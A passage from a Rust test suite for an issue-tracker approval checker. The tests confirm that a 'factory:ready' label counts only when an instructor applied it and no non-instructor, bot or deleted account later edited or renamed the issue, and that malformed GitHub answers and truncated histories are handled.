                ready_on(LABELED, "tom"),
                ready_off(AFTER, "Softfac-Bot"),
                label_event("LabeledEvent", AFTER, "Softfac-Bot", "factory:triage"),
            ],
            None,
            &creation_only("eve"),
        );
        let fake = FakeTracker::answering([Answer::ok(answer)]);
        let found = fake
            .claimed_approval(REPO, 6, PROJECT, &names(&["tom"]))
            .unwrap();
        assert_eq!(found, approved(LABELED, "tom"));
        assert_eq!(fake.calls(), vec![approval_call()]);
    }

    #[test]
    fn claimed_approval_with_a_malformed_timestamp_is_a_parse_error() {
        for at in ["2026-10-04 10:00:00Z", "", "yesterday"] {
            for answer in [
                events_reply(
                    &[ready_on(LABELED, "tom"), ready_off(at, PROJECT)],
                    None,
                    &creation_only("tom"),
                ),
                events_reply(
                    &[ready_on(LABELED, "tom")],
                    Some(e(at, "tom")),
                    &[e(CREATED, "tom"), e(AFTER, "tom")],
                ),
            ] {
                let fake = FakeTracker::answering([Answer::ok(answer)]);
                let error = fake
                    .claimed_approval(REPO, 6, PROJECT, &names(&["tom"]))
                    .unwrap_err();
                assert!(is_parse_error_of(Some(error), &approval_call()), "{at:?}");
                assert_eq!(fake.calls(), vec![approval_call()]);
            }
        }
    }

    // ---- approval ----

    #[test]
    fn approval_reads_the_real_shapes_and_sends_one_call() {
        let real = r#"{"data":{"repository":{"issue":{"timelineItems":{"totalCount":3,"nodes":[{"__typename":"UnlabeledEvent","createdAt":"2026-10-04T11:36:21Z","actor":{"__typename":"User","login":"rawphp"},"label":{"name":"factory:building"}},{"__typename":"LabeledEvent","createdAt":"2026-10-04T11:36:21Z","actor":{"__typename":"User","login":"rawphp"},"label":{"name":"factory:ready"}},{"__typename":"RenamedTitleEvent","createdAt":"2026-10-04T11:48:55Z","actor":{"__typename":"User","login":"rawphp"}}]},"lastEditedAt":null,"editor":null,"userContentEdits":{"totalCount":1,"nodes":[{"editedAt":"2026-10-04T09:50:06Z","editor":{"__typename":"User","login":"outside-user"}}]}}}}}"#;
        assert_eq!(
            approval_of(real, &["rawphp"]),
            approved("2026-10-04T11:36:21Z", "rawphp")
        );
    }

    #[test]
    fn an_outside_authors_unedited_report_labelled_by_an_instructor_is_approved() {
        // The creation entry is by the author, before the label, and is ignored.
        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            None,
            &creation_only("outsider"),
        );
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));
    }

    #[test]
    fn an_issue_with_no_history_at_all_is_approved_when_an_instructor_labelled_it() {
        let answer = events_reply(&[ready_on(LABELED, "tom")], None, &[]);
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));
    }

    #[test]
    fn the_instructor_comparison_ignores_case() {
        let answer = events_reply(
            &[ready_on(LABELED, "TomK")],
            Some(e(AFTER, "TOMK")),
            &[e(CREATED, "outsider"), e(AFTER, "TOMK")],
        );
        assert_eq!(approval_of(&answer, &["tomk"]), approved(LABELED, "TomK"));
    }

    #[test]
    fn other_labels_in_the_events_are_ignored() {
        let answer = events_reply(
            &[
                label_event("LabeledEvent", "2026-10-04T09:00:00Z", "eve", "bug"),
                ready_on(LABELED, "tom"),
                label_event("UnlabeledEvent", AFTER, "eve", "bug"),
                label_event("LabeledEvent", AFTER, "eve", "factory:readyish"),
            ],
            None,
            &creation_only("eve"),
        );
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));
    }

    #[test]
    fn a_label_applied_removed_and_applied_again_by_an_instructor_counts_the_later_event() {
        // A non-instructor applied it first and an instructor reviewed and re-applied it.
        let answer = events_reply(
            &[
                ready_on("2026-10-04T09:00:00Z", "eve"),
                ready_off("2026-10-04T09:30:00Z", "tom"),
                ready_on(LABELED, "tom"),
            ],
            None,
            &creation_only("eve"),
        );
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));
    }

    #[test]
    fn a_label_applied_by_an_instructor_then_reapplied_by_a_non_instructor_is_refused() {
        let answer = events_reply(
            &[
                ready_on("2026-10-04T09:00:00Z", "tom"),
                ready_off("2026-10-04T09:30:00Z", "tom"),
                ready_on(LABELED, "eve"),
            ],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(by_non_instructor(Some("eve"), LABELED))
        );
    }

    #[test]
    fn a_label_applied_by_a_non_instructor_is_refused() {
        let answer = events_reply(&[ready_on(LABELED, "eve")], None, &creation_only("eve"));
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(by_non_instructor(Some("eve"), LABELED))
        );
    }

    #[test]
    fn a_label_applied_by_a_deleted_account_is_refused() {
        let answer = events_reply(&[ready_on(LABELED, NOBODY)], None, &creation_only("tom"));
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(by_non_instructor(None, LABELED))
        );
    }

    #[test]
    fn a_label_that_was_removed_and_not_applied_again_is_not_found() {
        let answer = events_reply(
            &[
                ready_on("2026-10-04T09:00:00Z", "tom"),
                ready_off(LABELED, "tom"),
            ],
            None,
            &creation_only("tom"),
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(Refusal::LabelNotFound)
        );
    }

    #[test]
    fn no_label_events_at_all_is_not_found() {
        let answer = events_reply(&[], None, &creation_only("tom"));
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(Refusal::LabelNotFound)
        );
    }

    /// `n` events about another label, oldest first.
    fn noise(n: usize) -> Vec<Value> {
        (0..n)
            .map(|i| {
                label_event(
                    if i % 2 == 0 {
                        "LabeledEvent"
                    } else {
                        "UnlabeledEvent"
                    },
                    "2026-10-04T09:00:00Z",
                    "tom",
                    "bug",
                )
            })
            .collect()
    }

    #[test]
    fn a_hundred_events_of_a_longer_history_without_the_label_is_incomplete() {
        let answer = approval_reply(&noise(100), 150, None, &creation_only("tom"));
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(Refusal::LabelHistoryIncomplete)
        );
    }

    #[test]
    fn a_label_found_among_the_newest_hundred_is_enough_whatever_the_total() {
        let mut events = noise(99);
        events.push(ready_on(LABELED, "tom"));
        let answer = approval_reply(&events, 400, None, &creation_only("tom"));
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));
    }

    #[test]
    fn a_removal_among_the_newest_hundred_is_not_a_missing_history() {
        // The label was taken off in view: the history is not why it is missing.
        let mut events = vec![ready_on("2026-10-04T08:30:00Z", "tom")];
        events.extend(noise(98));
        events.push(ready_off(LABELED, "tom"));
        let answer = approval_reply(&events, 100, None, &creation_only("tom"));
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(Refusal::LabelNotFound)
        );
    }

    #[test]
    fn a_complete_hundred_or_a_short_page_without_the_label_is_only_not_found() {
        // Exactly 100 in all: nothing is hidden.
        let whole = approval_reply(&noise(100), 100, None, &creation_only("tom"));
        assert_eq!(
            approval_of(&whole, &["tom"]),
            refused(Refusal::LabelNotFound)
        );
        // A page short of 100 is not the cut-off that rule is about.
        let short = approval_reply(&noise(99), 120, None, &creation_only("tom"));
        assert_eq!(
            approval_of(&short, &["tom"]),
            refused(Refusal::LabelNotFound)
        );
    }

    #[test]
    fn an_instructor_edit_after_the_label_is_approved() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(AFTER, "amy")),
            &[e(CREATED, "eve"), e(AFTER, "amy")],
        );
        assert_eq!(
            approval_of(&answer, &["tom", "amy"]),
            approved(LABELED, "tom")
        );
    }

    #[test]
    fn a_non_instructor_edit_after_the_label_is_refused() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(AFTER, "eve")),
            &[e(CREATED, "eve"), e(AFTER, "eve")],
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn a_non_instructor_edit_followed_by_an_instructor_edit_is_refused() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(LATER, "tom")),
            &[e(CREATED, "eve"), e(AFTER, "eve"), e(LATER, "tom")],
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn an_edit_by_a_deleted_account_after_the_label_is_refused() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(AFTER, NOBODY)),
            &[e(CREATED, "eve"), e(AFTER, NOBODY)],
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn edits_before_the_label_are_ignored_whoever_made_them() {
        // The instructor approved the text as it stood when they applied the label.
        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e("2026-10-04T09:30:00Z", "eve")),
            &[
                e(CREATED, "eve"),
                e("2026-10-04T09:00:00Z", NOBODY),
                e("2026-10-04T09:30:00Z", "eve"),
            ],
        );
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));
    }

    #[test]
    fn an_edit_in_the_same_second_as_the_label_counts_as_after_it() {
        let stranger = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(LABELED, "eve")),
            &[e(CREATED, "eve"), e(LABELED, "eve")],
        );
        assert_eq!(
            approval_of(&stranger, &["tom"]),
            refused(edited_after(LABELED))
        );
        // An instructor's edit in that second is fine, and one second earlier is before it.
        let instructor = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(LABELED, "tom")),
            &[e(CREATED, "eve"), e(LABELED, "tom")],
        );
        assert_eq!(approval_of(&instructor, &["tom"]), approved(LABELED, "tom"));
        let before = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e("2026-10-04T09:59:59Z", "eve")),
            &[e(CREATED, "eve"), e("2026-10-04T09:59:59Z", "eve")],
        );
        assert_eq!(approval_of(&before, &["tom"]), approved(LABELED, "tom"));
    }

    #[test]
    fn only_the_label_that_is_in_force_sets_the_cut_off_for_edits() {
        // An edit between an old, removed label and the label now in force is before it.
        let answer = events_reply(
            &[
                ready_on("2026-10-04T09:00:00Z", "tom"),
                ready_off("2026-10-04T09:10:00Z", "tom"),
                ready_on(LABELED, "tom"),
            ],
            Some(e("2026-10-04T09:30:00Z", "eve")),
            &[e(CREATED, "eve"), e("2026-10-04T09:30:00Z", "eve")],
        );
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));
    }

    /// `n` seconds, one apart, from 10:01:00.
    fn seconds_after_label(n: usize) -> Vec<String> {
        (0..n)
            .map(|i| format!("2026-10-04T10:{}:{}Z", pad(1 + i / 60), pad(i % 60)))
            .collect()
    }

    #[test]
    fn a_full_page_of_edits_is_an_incomplete_history() {
        let times = seconds_after_label(100);
        let history = |n: usize| -> Vec<Edit> { times[..n].iter().map(|t| e(t, "tom")).collect() };
        let last = |n: usize| -> Option<Edit> { Some(e(&times[n - 1], "tom")) };
        let events = || vec![ready_on(LABELED, "tom")];
        assert_eq!(
            approval_of(&events_reply(&events(), last(99), &history(99)), &["tom"]),
            approved(LABELED, "tom")
        );
        assert_eq!(
            approval_of(&events_reply(&events(), last(100), &history(100)), &["tom"]),
            refused(history_cut(LABELED))
        );
    }

    #[test]
    fn an_edit_total_above_the_page_is_an_incomplete_history_when_the_label_may_be_hidden() {
        // Both shown entries are after the label, so older ones could be too.
        let nodes = [e(LATER, "tom"), e(AFTER, "tom")];
        let last = Some(e(LATER, "tom"));
        let run = |total: usize| {
            approval_of(
                &approval_reply_raw(&[ready_on(LABELED, "tom")], 1, last, &nodes, total),
                &["tom"],
            )
        };
        assert_eq!(run(2), approved(LABELED, "tom"));
        assert_eq!(run(5), refused(history_cut(LABELED)));
    }

    #[test]
    fn the_newest_edit_entry_must_be_the_last_edit() {
        let create = e(CREATED, "tom");
        let last = Some(e(AFTER, "tom"));
        let run = |nodes: &[Edit]| {
            approval_of(
                &approval_reply_raw(&[ready_on(LABELED, "tom")], 1, last, nodes, nodes.len()),
                &["tom", "amy"],
            )
        };
        assert_eq!(run(&[e(AFTER, "tom"), create]), approved(LABELED, "tom"));
        // Another time, another editor (both instructors), or no entry for it.
        let wrong: [&[Edit]; 4] = [
            &[e("2026-10-04T10:20:00Z", "tom"), create],
            &[e(AFTER, "amy"), create],
            &[create],
            &[],
        ];
        for nodes in wrong {
            assert_eq!(run(nodes), refused(history_cut(LABELED)));
        }
    }

    #[test]
    fn a_visible_stranger_edit_is_named_even_when_the_history_is_also_cut_off() {
        let nodes = [e(AFTER, "eve"), e(CREATED, "tom")];
        let answer = approval_reply_raw(
            &[ready_on(LABELED, "tom")],
            1,
            Some(e(AFTER, "eve")),
            &nodes,
            9,
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn the_label_is_judged_before_the_edits() {
        let answer = events_reply(
            &[ready_on(LABELED, "eve")],
            Some(e(AFTER, "eve")),
            &[e(CREATED, "eve"), e(AFTER, "eve")],
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(by_non_instructor(Some("eve"), LABELED))
        );
    }

    #[test]
    fn approval_with_no_instructors_approves_nothing() {
        let answer = events_reply(&[ready_on(LABELED, "tom")], None, &creation_only("tom"));
        assert_eq!(
            approval_of(&answer, &[]),
            refused(by_non_instructor(Some("tom"), LABELED))
        );
    }

    /// The error `approval` gives for this answer, or none when it reads it.
    fn approval_error(answer: &str) -> Option<TrackerError> {
        let fake = FakeTracker::answering([Answer::ok(answer)]);
        fake.approval(REPO, 6, &names(&["tom"])).err()
    }

    /// Whether `error` is a parse error that names the call with `call`.
    fn is_parse_error_of(error: Option<TrackerError>, call: &[String]) -> bool {
        match error {
            Some(TrackerError::Other {
                kind: OtherKind::Parse,
                message,
            }) => message.starts_with(&format!(
                "`{}` returned unexpected output",
                command_text(call)
            )),
            _ => false,
        }
    }

    /// Whether `answer` is a parse error that names the approval call.
    fn is_approval_parse_error(answer: &str) -> bool {
        is_parse_error_of(approval_error(answer), &approval_call())
    }

    #[test]
    fn approval_answers_that_cannot_be_read_are_parse_errors() {
        let good = |events: Value, edits: Value| {
            json!({"data": {"repository": {"issue": {
                "timelineItems": {"totalCount": 1, "nodes": events},
                "lastEditedAt": null,
                "editor": null,
                "userContentEdits": edits,
            }}}})
            .to_string()
        };
        let edits = edits_json(&[e(CREATED, "tom")], 1);
        // The control: this one is fine.
        assert!(!is_approval_parse_error(&good(
            json!([ready_on(LABELED, "tom")]),
            edits.clone()
        )));

        for bad in [
            "not json",
            "",
            "{}",
            r#"{"data":{"repository":null}}"#,
            r#"{"errors":[{"message":"x"}]}"#,
            // No label events, no edit history, no total counts.
            r#"{"data":{"repository":{"issue":{"lastEditedAt":null,"editor":null,"userContentEdits":{"totalCount":0,"nodes":[]}}}}}"#,
            r#"{"data":{"repository":{"issue":{"timelineItems":{"totalCount":0,"nodes":[]},"lastEditedAt":null,"editor":null}}}}"#,
            r#"{"data":{"repository":{"issue":{"timelineItems":{"nodes":[]},"lastEditedAt":null,"editor":null,"userContentEdits":{"totalCount":0,"nodes":[]}}}}}"#,
        ] {
            assert!(is_approval_parse_error(bad), "{bad}");
        }
        // A node missing its time, its label, or its type, or of a type we did not ask for.
        for broken in [
            json!({"__typename": "LabeledEvent", "actor": {"login": "tom"}, "label": {"name": "factory:ready"}}),
            json!({"__typename": "LabeledEvent", "createdAt": LABELED, "actor": {"login": "tom"}}),
            json!({"createdAt": LABELED, "actor": {"login": "tom"}, "label": {"name": "factory:ready"}}),
            json!({"__typename": "ClosedEvent", "createdAt": LABELED}),
        ] {
            assert!(
                is_approval_parse_error(&good(json!([broken.clone()]), edits.clone())),
                "{broken}"
            );
        }
    }

    #[test]
    fn a_malformed_timestamp_is_a_parse_error() {
        for at in [
            "2026-10-04 10:00:00Z",
            "2026-10-04T10:00:00",
            "",
            "yesterday",
        ] {
            // In the label event.
            let in_label = events_reply(&[ready_on(at, "tom")], None, &creation_only("tom"));
            assert!(is_approval_parse_error(&in_label), "label at {at}");
            // In the edit history.
            let in_edit = events_reply(
                &[ready_on(LABELED, "tom")],
                Some(e(AFTER, "tom")),
                &[e(CREATED, "tom"), e(at, "tom")],
            );
            assert!(is_approval_parse_error(&in_edit), "edit at {at}");
            // In lastEditedAt.
            let in_last = events_reply(
                &[ready_on(LABELED, "tom")],
                Some(e(at, "tom")),
                &[e(CREATED, "tom"), e(at, "tom")],
            );
            assert!(is_approval_parse_error(&in_last), "last edit at {at}");
            let in_rename = events_reply(
                &[ready_on(LABELED, "tom"), rename_event(at, "tom")],
                None,
                &creation_only("tom"),
            );
            assert!(is_approval_parse_error(&in_rename), "rename at {at}");
        }
    }

    #[test]
    fn a_malformed_last_edited_at_alone_is_a_parse_error() {
        for at in ["2026-10-04 10:00:00Z", "", "yesterday"] {
            // Every edit node is well formed; only lastEditedAt is not.
            let answer = events_reply(
                &[ready_on(LABELED, "tom")],
                Some(e(at, "tom")),
                &[e(CREATED, "tom"), e(AFTER, "tom")],
            );
            assert!(
                is_approval_parse_error(&answer),
                "approval, last edit at {at:?}"
            );

            let fake = FakeTracker::answering([Answer::ok(answer)]);
            let error = fake.text_edited_since(REPO, 6, BEFORE).unwrap_err();
            assert!(
                is_parse_error_of(Some(error), &approval_call()),
                "text_edited_since, last edit at {at:?}"
            );
        }
    }

    #[test]
    fn approval_failures_from_gh_are_errors_with_the_call() {
        let failed = FakeTracker::answering([Answer::fail(1, "HTTP 502")]);
        let error = failed.approval(REPO, 6, &names(&["tom"])).unwrap_err();
        assert_eq!(
            error,
            TrackerError::Other {
                kind: OtherKind::NoAnswer,
                message: format!(
                    "`{}` exited with status 1: HTTP 502",
                    command_text(&approval_call())
                )
            }
        );

        let spawn = FakeTracker::answering([Answer::NotStarted("no such file".into())]);
        let error = spawn.approval(REPO, 6, &names(&["tom"])).unwrap_err();
        assert_eq!(
            error,
            TrackerError::Other {
                kind: OtherKind::NotStarted,
                message: format!(
                    "cannot start `{}`: no such file",
                    command_text(&approval_call())
                )
            }
        );
    }

    /// `n` instructor renames after the label, oldest first, one second apart.
    fn renames_after_label(n: usize) -> Vec<Value> {
        seconds_after_label(n)
            .iter()
            .map(|at| rename_event(at, "tom"))
            .collect()
    }

    #[test]
    fn a_title_renamed_by_a_non_instructor_after_the_label_is_refused() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom"), rename_event(AFTER, "eve")],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn a_title_renamed_by_an_instructor_after_the_label_is_approved() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom"), rename_event(AFTER, "AMY")],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            approval_of(&answer, &["tom", "amy"]),
            approved(LABELED, "tom")
        );
    }

    #[test]
    fn a_rename_by_a_deleted_account_after_the_label_is_refused() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom"), rename_event(AFTER, NOBODY)],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn a_stranger_rename_followed_by_an_instructor_rename_is_refused() {
        let answer = events_reply(
            &[
                ready_on(LABELED, "tom"),
                rename_event(AFTER, "eve"),
                rename_event(LATER, "tom"),
            ],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn a_stranger_rename_is_refused_even_when_every_body_edit_is_an_instructors() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom"), rename_event(LATER, "eve")],
            Some(e(AFTER, "tom")),
            &[e(CREATED, "eve"), e(AFTER, "tom")],
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn renames_before_the_label_in_force_are_ignored() {
        // Before the label, and between a removed label and the one in force.
        let answer = events_reply(
            &[
                rename_event("2026-10-04T08:30:00Z", "eve"),
                ready_on("2026-10-04T09:00:00Z", "tom"),
                ready_off("2026-10-04T09:10:00Z", "tom"),
                rename_event("2026-10-04T09:30:00Z", NOBODY),
                ready_on(LABELED, "tom"),
            ],
            None,
            &creation_only("eve"),
        );
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));
    }

    #[test]
    fn a_rename_in_the_same_second_as_the_label_counts_as_after_it() {
        let stranger = events_reply(
            &[ready_on(LABELED, "tom"), rename_event(LABELED, "eve")],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            approval_of(&stranger, &["tom"]),
            refused(edited_after(LABELED))
        );
        let instructor = events_reply(
            &[
                rename_event("2026-10-04T09:59:59Z", "eve"),
                ready_on(LABELED, "tom"),
                rename_event(LABELED, "tom"),
            ],
            None,
            &creation_only("eve"),
        );
        assert_eq!(approval_of(&instructor, &["tom"]), approved(LABELED, "tom"));
    }

    #[test]
    fn labels_and_renames_share_the_page_and_the_label_in_force_is_enough() {
        // The oldest event shown is before the label, so every event in or after the label's
        // second, the renames included, is on the page: events come oldest first and the page
        // is the newest 100. Nothing before the label matters, whatever the total.
        let mut events = vec![
            rename_event("2026-10-04T09:59:59Z", "eve"),
            ready_on(LABELED, "tom"),
        ];
        events.extend(renames_after_label(98));
        let answer = approval_reply(&events, 400, None, &creation_only("eve"));
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));

        // With the label the oldest event shown, a rename in its second could be on the page
        // before this one.
        let mut oldest = vec![ready_on(LABELED, "tom")];
        oldest.extend(renames_after_label(99));
        let cut = approval_reply(&oldest, 400, None, &creation_only("eve"));
        assert_eq!(approval_of(&cut, &["tom"]), refused(history_cut(LABELED)));

        // A stranger's rename on that page is seen.
        let mut with_stranger = events.clone();
        with_stranger[50] = rename_event("2026-10-04T10:20:00Z", "eve");
        let seen = approval_reply(&with_stranger, 400, None, &creation_only("eve"));
        assert_eq!(approval_of(&seen, &["tom"]), refused(edited_after(LABELED)));
    }

    #[test]
    fn a_page_of_renames_without_the_label_is_a_missing_label_history_not_a_stranger_edit() {
        // The label is older than all 100 shown events. Nothing shown can be told to be after it.
        let events: Vec<Value> = (0..100).map(|_| rename_event(AFTER, "eve")).collect();
        let answer = approval_reply(&events, 150, None, &creation_only("eve"));
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(Refusal::LabelHistoryIncomplete)
        );
    }

    /// `n` seconds, one apart, from `hour`:00:00.
    fn edit_times(hour: usize, n: usize) -> Vec<String> {
        (0..n)
            .map(|i| format!("2026-10-04T{}:{}:{}Z", pad(hour), pad(i / 60), pad(i % 60)))
            .collect()
    }

    #[test]
    fn a_hundred_edits_with_the_oldest_shown_before_the_label_are_judged_by_the_visible_ones() {
        // 99 entries before the label (09:xx) and the newest, an instructor's, after it.
        let times = edit_times(9, 99);
        let mut history: Vec<Edit> = times.iter().map(|t| e(t, "tom")).collect();
        history.push(e(AFTER, "tom"));
        let events = || vec![ready_on(LABELED, "tom")];
        let answer = events_reply(&events(), Some(e(AFTER, "tom")), &history);
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));

        // The same page with the newest edit by a stranger.
        let mut with_stranger: Vec<Edit> = history[..99].to_vec();
        with_stranger.push(e(AFTER, "eve"));
        let refused_answer = events_reply(&events(), Some(e(AFTER, "eve")), &with_stranger);
        assert_eq!(
            approval_of(&refused_answer, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn a_hundred_edits_all_after_the_label_cannot_be_judged() {
        let times = seconds_after_label(100);
        let history: Vec<Edit> = times.iter().map(|t| e(t, "tom")).collect();
        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(&times[99], "tom")),
            &history,
        );
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(history_cut(LABELED))
        );
    }

    #[test]
    fn a_total_above_the_page_is_judged_when_the_oldest_shown_entry_is_before_the_label() {
        let last = Some(e(LATER, "tom"));
        let run = |nodes: &[Edit]| {
            approval_of(
                &approval_reply_raw(&[ready_on(LABELED, "tom")], 1, last, nodes, 150),
                &["tom"],
            )
        };
        assert_eq!(
            run(&[
                e(LATER, "tom"),
                e(AFTER, "tom"),
                e("2026-10-04T09:30:00Z", "tom")
            ]),
            approved(LABELED, "tom")
        );
        // The oldest shown entry must be strictly before the label.
        assert_eq!(
            run(&[e(LATER, "tom"), e(LABELED, "tom")]),
            refused(history_cut(LABELED))
        );
        assert_eq!(
            run(&[e(LATER, "tom"), e(AFTER, "tom")]),
            refused(history_cut(LABELED))
        );
    }

    #[test]
    fn a_cut_page_still_needs_its_newest_entry_to_be_the_last_edit() {
        let times = edit_times(9, 99);
        let mut nodes: Vec<Edit> = vec![e(LATER, "tom")];
        nodes.extend(times.iter().rev().map(|t| e(t, "tom")));
        assert_eq!(nodes.len(), 100);
        let run = |last: Edit| {
            approval_of(
                &approval_reply_raw(&[ready_on(LABELED, "tom")], 1, Some(last), &nodes, 100),
                &["tom"],
            )
        };
        assert_eq!(run(e(LATER, "tom")), approved(LABELED, "tom"));
        // GitHub says the last edit was another one.
        assert_eq!(run(e(AFTER, "tom")), refused(history_cut(LABELED)));
        assert_eq!(run(e(LATER, "amy")), refused(history_cut(LABELED)));
    }

    #[test]
    fn a_label_applied_by_an_actor_that_is_not_a_user_is_refused_whatever_its_login() {
        for typename in [
            "Bot",
            "Organization",
            "Mannequin",
            "EnterpriseUserAccount",
            "",
        ] {
            let mut event = ready_on(LABELED, "tom");
            event["actor"] = json!({"__typename": typename, "login": "tom"});
            let answer = events_reply(&[event], None, &creation_only("eve"));
            assert_eq!(
                approval_of(&answer, &["tom"]),
                refused(by_non_instructor(Some("tom"), LABELED)),
                "{typename}"
            );
        }
    }

    #[test]
    fn an_actor_without_a_typename_is_not_an_instructor() {
        let mut event = ready_on(LABELED, "tom");
        event["actor"] = json!({"login": "tom"});
        let answer = events_reply(&[event], None, &creation_only("eve"));
        assert_eq!(
            approval_of(&answer, &["tom"]),
            refused(by_non_instructor(Some("tom"), LABELED))
        );
    }

    /// `answer` with the type of the newest history entry's editor replaced.
    fn with_editor_typename(answer: &str, typename: &str) -> String {
        let mut json: Value = serde_json::from_str(answer).unwrap();
        json["data"]["repository"]["issue"]["userContentEdits"]["nodes"][0]["editor"]["__typename"] =
            json!(typename);
        json.to_string()
    }

    #[test]
    fn a_body_edit_or_rename_by_something_that_is_not_a_user_after_the_label_is_refused() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(AFTER, "tom")),
            &[e(CREATED, "eve"), e(AFTER, "tom")],
        );
        assert_eq!(approval_of(&answer, &["tom"]), approved(LABELED, "tom"));
        for typename in ["Bot", "Mannequin", ""] {
            assert_eq!(
                approval_of(&with_editor_typename(&answer, typename), &["tom"]),
                refused(edited_after(LABELED)),
                "edit by {typename}"
            );
        }

        let mut rename = rename_event(AFTER, "tom");
        rename["actor"] = json!({"__typename": "Bot", "login": "tom"});
        let renamed = events_reply(
            &[ready_on(LABELED, "tom"), rename],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            approval_of(&renamed, &["tom"]),
            refused(edited_after(LABELED))
        );
    }

    #[test]
    fn a_creation_entry_by_something_that_is_not_a_user_before_the_label_is_ignored() {
        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            None,
            &creation_only("dependabot"),
        );
        assert_eq!(
            approval_of(&with_editor_typename(&answer, "Bot"), &["tom"]),
            approved(LABELED, "tom")
        );
    }

    #[test]
    fn approval_for_a_repo_that_is_not_owner_name_makes_no_call() {
        let fake = FakeTracker::new();
        let error = fake.approval("softfac", 6, &names(&["tom"])).unwrap_err();
        assert!(
            matches!(&error, TrackerError::Other { kind: OtherKind::Parse, message: m } if m.contains("returned unexpected output")),
            "{error}"
        );
        assert!(fake.calls().is_empty());
    }

    // ---- text_check ----

    fn text_check_of(answer: &str, since: &str, who: &[&str]) -> TextCheck {
        let fake = FakeTracker::answering([Answer::ok(answer)]);
        let found = fake.text_check(REPO, 6, since, &names(who)).unwrap();
        assert_eq!(fake.calls(), vec![approval_call()]);
        found
    }

    #[test]
    fn text_check_tells_unchanged_from_changed_from_unjudged() {
        // Unchanged: instructors only.
        let instructors = events_reply(
            &[ready_on(LABELED, "tom"), rename_event(AFTER, "tom")],
            Some(e(AFTER, "tom")),
            &[e(CREATED, "eve"), e(AFTER, "tom")],
        );
        assert_eq!(
            text_check_of(&instructors, LABELED, &["tom"]),
            TextCheck::Unchanged
        );
        // Changed: a stranger's rename, a deleted account's edit.
        let renamed = events_reply(
            &[ready_on(LABELED, "tom"), rename_event(AFTER, "eve")],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            text_check_of(&renamed, LABELED, &["tom"]),
            TextCheck::Changed
        );
        let edited = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(AFTER, NOBODY)),
            &[e(CREATED, "eve"), e(AFTER, NOBODY)],
        );
        assert_eq!(
            text_check_of(&edited, LABELED, &["tom"]),
            TextCheck::Changed
        );
    }

    #[test]
    fn text_check_says_unjudged_when_the_histories_cannot_be_read_whole() {
        // A full page of body edits after the label, all by instructors, with more behind it.
        let times = seconds_after_label(100);
        let oldest_first: Vec<Edit> = times.iter().map(|t| e(t, "tom")).collect();
        let last = Some(e(&times[99], "tom"));
        let full = events_reply(&[ready_on(LABELED, "tom")], last, &oldest_first);
        assert_eq!(text_check_of(&full, LABELED, &["tom"]), TextCheck::Unjudged);
        // A stranger shown on that page is still a change: it wins.
        let mut with_stranger = oldest_first.clone();
        with_stranger[50] = e(&times[50], "eve");
        let stranger = events_reply(&[ready_on(LABELED, "tom")], last, &with_stranger);
        assert_eq!(
            text_check_of(&stranger, LABELED, &["tom"]),
            TextCheck::Changed
        );
    }

    #[test]
    fn text_check_ignores_who_applied_labels_but_not_bots() {
        // Labels are not text: a stranger's label event is not a change.
